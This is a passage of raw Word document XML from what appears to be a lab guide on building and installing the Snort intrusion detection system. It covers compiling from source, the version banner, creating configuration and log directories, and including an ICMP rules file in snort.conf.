        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bpcap*  pc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">e*   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="4" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4997"/>
      </w:pPr>
      <w:hyperlink r:id="rId66">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 xml:space="preserve">cd snort-2.9.8.3 </w:t>
      </w:r>
      <w:hyperlink r:id="rId67">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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>conf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:hyperlink r:id="rId68">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 xml:space="preserve">make </w:t>
      </w:r>
      <w:hyperlink r:id="rId69">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 xml:space="preserve">make </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nsta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId7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snort --vers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="280"/>
      </w:pPr>
      <w:r>
        <w:t>,,_     -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:t>&gt; Snor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:t>*-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="182" w:right="5554"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">o"  )~ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t>ers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on 2.9.8.2 GRE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(Bu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>335)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="760" w:right="1906" w:hanging="480"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:r>
        <w:t>'    By Mar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>sch &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>nort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId71" w:anchor="team">
        <w:r>
          <w:t>h</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:t>p</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>/w</w:t>
        </w:r>
        <w:r>
          <w:t>w</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-15"/>
          </w:rPr>
          <w:t>w</w:t>
        </w:r>
        <w:r>
          <w:t>.snor</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:t>.o</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-4"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:t>g</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:t>con</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:t>ac</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>#</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:t>eam</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> Copyr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ght</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(C) 2014-2015 C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sco</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s reserved. Copyr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ght</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(C) 1998-2013 Source</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re, Inc.,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="722" w:right="6257"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>bpcap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>vers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on 1.7.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="760"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng PCRE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>8.38 2015-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>23</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4266" w:firstLine="660"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>Z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>IB vers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>1.2.8</w:t>
      </w:r>
      <w:hyperlink r:id="rId72">
        <w:r>
          <w:t xml:space="preserve"> [roo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mkd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">snort </w:t>
      </w:r>
      <w:hyperlink r:id="rId73">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mkd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>snort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ru</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">es </w:t>
      </w:r>
      <w:hyperlink r:id="rId74">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mkd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>og</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">snort </w:t>
      </w:r>
      <w:hyperlink r:id="rId75">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vi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>snort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>snort.conf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1060" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ne-               </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="34"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ude </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>snort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ru</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>cmp.ru</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId76">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vi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>snort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ru</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
